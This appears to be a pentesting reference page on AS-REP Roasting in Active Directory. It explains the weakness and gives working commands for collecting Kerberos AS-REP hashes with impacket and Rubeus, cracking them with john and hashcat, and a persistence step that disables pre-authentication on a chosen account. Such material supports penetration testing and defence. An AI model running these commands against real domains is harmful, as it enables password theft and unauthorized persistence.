# AS-REP Roasting

The ASREPRoast attack looks for **users without Kerberos pre-authentication required attribute (**[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**)**_.

That means that anyone can send an AS\_REQ request to the DC on behalf of any of those users, and receive an AS\_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.

Furthermore, **no domain account is needed to perform this attack**, only connection to the DC. However, **with a domain account**, a LDAP query can be used to **retrieve users without Kerberos pre-authentication** in the domain. **Otherwise usernames have to be guessed**.

{% code title="Using Linux" %}
```bash
impacket-GetNPUsers -no-pass -request -dc-ip 10.10.10.10 domain.local/ -usersfile users.lst
impacket-GetNPUsers -no-pass -request -dc-ip 10.10.10.10 domain.local/ -usersfile users.lst | grep krb5asrep

impacket-GetNPUsers spookysec.local/ -usersfile usernames.txt -format hashcat 

#Try all the usernames in usernames.txt
impacket-GetNPUsers jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
impacket-GetNPUsers jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Using WIndows" %}
```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

### Cracking

```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```

### Persistence

Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):

```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

## References

[**More information about AS-REP Roasting in ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
